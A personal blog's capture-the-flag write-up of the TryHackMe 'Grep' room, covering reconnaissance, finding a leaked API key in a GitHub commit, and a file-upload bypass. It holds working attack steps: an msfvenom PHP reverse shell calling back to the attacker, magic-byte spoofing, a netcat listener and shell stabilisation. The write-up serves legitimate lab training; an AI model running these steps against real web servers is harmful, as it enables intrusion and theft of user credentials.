---
title: "CTF writeup: Grep (TryHackMe)"
description: "This is my writeup of the recently released CTF challenge on TryHackMe called \"Grep\". As usual, follow along in case you get stuck on any of the questions!"
author: "ogjojo"
hidedescription: false
date: 2023-08-21T22:27:58+03:00
tags: ["ctf", "writeup"]
category: ["blog"]
draft: false
toc: true
disableanchors: false
disablebreadcrumbs: false
disablereadingtime: false
disablewordcount: false
editPost:
    disabled: false
---
Link to challenge: [Grep](https://tryhackme.com/room/greprtp)

## The task

> SuperSecure Corp, a fast-paced startup, is currently creating a blogging platform inviting security professionals to assess its security. The challenge involves using OSINT techniques to gather information from publicly accessible sources and exploit potential vulnerabilities in the web application.

## Q1: What is the API key that allows a user to register on the website?

Navigating over to the website, which in my case is `http://10.10.2.144/`, gives us the "Apache2 Ubuntu Default Page". Cool, at least we know they're running Apache.

Next, let's run an ***nmap*** scan and see what we get.

Commands:
```bash
export ip=10.10.2.144
nmap -A -oN nmap-$ip.out -p- $ip
```

Output:
```plaintext
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-21 15:42 EDT
Nmap scan report for 10.10.2.144
Host is up (0.049s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 59:d4:ee:f9:7a:62:ac:9a:6f:46:47:b7:30:c7:63:9f (RSA)
|   256 d4:b3:61:f1:56:31:90:75:80:b1:f0:d9:18:ba:43:30 (ECDSA)
|_  256 9b:2e:1a:a5:ff:1e:42:2e:12:0b:34:47:21:91:2d:3a (ED25519)
80/tcp    open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
443/tcp   open  ssl/http Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: 403 Forbidden
| ssl-cert: Subject: commonName=grep.thm/organizationName=SearchME/stateOrProvinceName=Some-State/countryName=US
| Not valid before: 2023-06-14T13:03:09
|_Not valid after:  2024-06-13T13:03:09
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
51337/tcp open  http     Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: 400 Bad Request
Service Info: Host: ip-10-10-2-144.eu-west-1.compute.internal; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.43 seconds
```

A few things to take note of:

- SSH is running in case we find login credentials
- Version of Apache is **2.4.41**
- There's are Apache servers running on ports **80**, **443** and **51337**

Let's go have a look at what exactly is being served over on ports 443 and 51337.

- Port 443: we get a "Forbidden" message.
- Port 51337: same thing.

Ok, next let's have a look at the self signed SSL certificates for the sites running on these ports. On port 443, we get a certificate for "grep.thm" and on port 51337 we get "leakchecker.grep.thm".

Screenshots of the certificates:

![06](/pics/ctf-thm-grep/06.webp)

![07](/pics/ctf-thm-grep/07.webp)

Navigating to these domains at the moment gives us a "Server Not Found" error but we can fix that by adding these domains to our `/etc/hosts` file like so:
```plaintext
# /etc/hosts

10.10.2.144     grep.thm leakchecker.grep.thm
```

BINGO! Accept the risk and we're in! Well, sort of anyway.

grep.thm (port 443):

![03](/pics/ctf-thm-grep/03.webp)

leakchecker.grep.thm (port 51337):

![02](/pics/ctf-thm-grep/02.webp)

The question asks for the API key which allows a user to sign up. Let's navigate over to `grep.thm/public/html/register.php` and have a look.

Trying to sign up gives this error:

![04](/pics/ctf-thm-grep/04.webp)

Looking at the source code, there's a file called `register.js` which has an API key. This key is obviously not the API key we're looking for, so we need to find the correct one. Now, in the image below, you can see the `register.js` file sends this data to `../../api/register.php`. I'm interested in the `api`.

![05](/pics/ctf-thm-grep/05.webp)

Navigating to it gives just a blank page. Let's fire up ***ffuf*** and see what we get!

Command:
```bash
ffuf -w /home/kali/.local/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u https://grep.thm/api/FUZZ -e ".php"
```

Output:
```plaintext

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://grep.thm/api/FUZZ
 :: Wordlist         : FUZZ: /home/kali/.local/share/wordlists/SecLists/Discovery/Web-Content/big.txt
 :: Extensions       : .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 47ms]
    * FUZZ: .htaccess

[Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 46ms]
    * FUZZ: .htaccess.php

[Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 46ms]
    * FUZZ: .htpasswd

[Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 46ms]
    * FUZZ: .htpasswd.php

[Status: 200, Size: 34, Words: 3, Lines: 1, Duration: 136ms]
    * FUZZ: add_post.php

[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 137ms]
    * FUZZ: config.php

[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 181ms]
    * FUZZ: index.php

[Status: 200, Size: 42, Words: 4, Lines: 1, Duration: 110ms]
    * FUZZ: logout.php

[Status: 200, Size: 34, Words: 3, Lines: 1, Duration: 315ms]
    * FUZZ: login.php

[Status: 200, Size: 25, Words: 3, Lines: 1, Duration: 139ms]
    * FUZZ: posts.php

[Status: 200, Size: 38, Words: 5, Lines: 1, Duration: 47ms]
    * FUZZ: register.php

[Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 47ms]
    * FUZZ: uploads

[Status: 200, Size: 39, Words: 3, Lines: 1, Duration: 134ms]
    * FUZZ: upload.php

:: Progress: [40952/40952] :: Job [1/1] :: 858 req/sec :: Duration: [0:03:59] :: Errors: 0 ::
```

This is all well and good for later, most likely, but for now I cannot spot anything that would be of much use to us. Let's do some OSINT gathering.

The SSL certificate for `grep.thm` had "SearchMe" as the organization.

On Github, searching for "searchme" will give us a bunch of results. We can narrow the results down by selecting a language we want to filter by. In this case, the language we most likely want to filter by is PHP. Doing so yields these results:

![08](/pics/ctf-thm-grep/08.webp)

What are we looking for? Let's recap:
- The app that SuperSecure Corp is building is a blogging platform, so perhaps something that might refer to a content management system
- As this challenge was created recently, the repository should also be relatively recently updated
- Something probably written in PHP

Out of the results, this one sticks out to me:

![09](/pics/ctf-thm-grep/09.webp)

Let's dig through it to see if we can find anything interesting.

The file `searchmecms/api/register.php` contains the same header name as we saw in that `javascript` file before: `X-THM-API-KEY`. Now let's look at the commits if we can find the actual key!

![10](/pics/ctf-thm-grep/10.webp)

There it is, in commit `db11421`.

### A: *ffe60ecaa8bba\*\*\**

## Q2: What is the first flag?

Now that we have the API key, we can go ahead and create a user.

I'll be using Burp Suite for this. First, capture the POST request from `https://grep.thm/public/html/register.php`, then by editing `X-Thm-Api-Key` value to match what we found earlier, we should be able to register a new user.

![11](/pics/ctf-thm-grep/11.webp)

Aaand success!

![12](/pics/ctf-thm-grep/12.webp)

Loggin in gives us the first flag!🚩

### A: *THM{4ec\*\*\*}*

## Q3: What is the email of the "admin" user?

Looking at the dashboard, we can only see posts and that admin has posted 2 times. Not very useful when we need to find the admin user's email address.

I think it's reverse shell time!

Looking the the `upload.php` file in the Github repository we can see detailed information on what kind of files are allowed. This is very useful information, thank you very much!

```php
<?php
session_start();
require 'config.php';
$uploadPath = 'uploads/';

function checkMagicBytes($fileTmpPath, $validMagicBytes) {
    $fileMagicBytes = file_get_contents($fileTmpPath, false, null, 0, 4);
    return in_array(bin2hex($fileMagicBytes), $validMagicBytes);
}

$allowedExtensions = ['jpg', 'jpeg', 'png', 'bmp'];
$validMagicBytes = [
    'jpg' => 'ffd8ffe0', 
    'png' => '89504e47', 
    'bmp' => '424d'
];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_SESSION['username'])) {
        if (isset($_FILES['file'])) {
            $file = $_FILES['file'];
            $fileName = $file['name'];
            $fileTmpPath = $file['tmp_name'];
            $fileExtension = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));

            if (checkMagicBytes($fileTmpPath, $validMagicBytes)) {
                $uploadDestination = $uploadPath . $fileName;
                move_uploaded_file($fileTmpPath, $uploadDestination);

                echo json_encode(['message' => 'File uploaded successfully.']);
            } else {
                echo json_encode(['error' => 'Invalid file type. Only JPG, JPEG, PNG, and BMP files are allowed.']);
            }
        } else {
            echo json_encode(['error' => 'No file uploaded.']);
        }
    } else {
        echo json_encode(['error' => 'User not logged in.']);
    }
} else {
    echo json_encode(['error' => 'Unsupported request method.']);
}
?>
```

At first glance it seems like the code is checking both the file extension AND the magic bytes. However, it does, in fact only check to see if the magic bytes of the file being uploaded are allowed. `$allowedExtensions` is defined but never used! This means we should be able to upload the file with a `.php` extension, only modifying the magic bytes.

1. Creaft the reverse shell using ***msfvenom*** with the following command:
```bash
msfvenom -p php/reverse_php LHOST=<YOUR IP HERE> LPORT=4444 -o revshell.php
```
2. Add 4 A's (or any character really) to the beginning of the file
3. Edit the file with ***hexeditor*** and change the values of the 4 first hexadecimal values to *"FF D8 FF E0"* (or to any other of the allowed values)

Now let's try our new file on the upload page. In our ***ffuf*** scan we found a file called `upload.php` and the upload page is accessible to us at `https://grep.thm/public/html/upload.php`. Let's see what happens!

Ah, yes! We get a beautiful `{"message":"File uploaded successfully."}` message in our browser. Now we just need to navigate over to `https://grep.thm/api/uploads/` and activate the file from there.

Set up a listener:
```bash
nc -lvnp 4444
```

There is our reverse shell!

Before doing anything else, let's stabilise this netcat shell.

Once you have the reverse shell, do the following:
1. Run:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
2. Then:
```bash
export TERM=xterm
```
3. Then background the netcat shell by hitting **CTRL+Z**.
4. Then turn off your own terminal echo and foreground the netcat shell with:
```bash
stty raw -echo; fg
```

Now let's find that admin email!

Looking through the contents of the `/var/www` directory, there sure are many interesting files we cannot access as `www-data`, but one that we can access is `/var/www/backup/users.sql`.

Running `cat users.sql` reveals the admin's email address.

### A: *admin@\*\*\*.grep.thm*


## Q4: What is the host name of the web application that allows a user to check an email for a possible password leak?

This one we got a while back when looking at the certificates.

### A: *\*\*\*.grep.thm*

## Q5: What is the password of the "admin" user?

Now, we could go ahead and try to brute force the password hash found in the `users.sql` file or try to put the email into the form over at `https://leadchecker.grep.thm:51337` and see what we get.

Going with option two sure enough gives us the password:

![13](/pics/ctf-thm-grep/13.webp)

### A: *admin_\*\*\*!*

___

Thank you for reading my writeup of this CTF challenge! This one had me scratching my head at times but it was fun. I learned a lot once again.

Have a nice day! :)
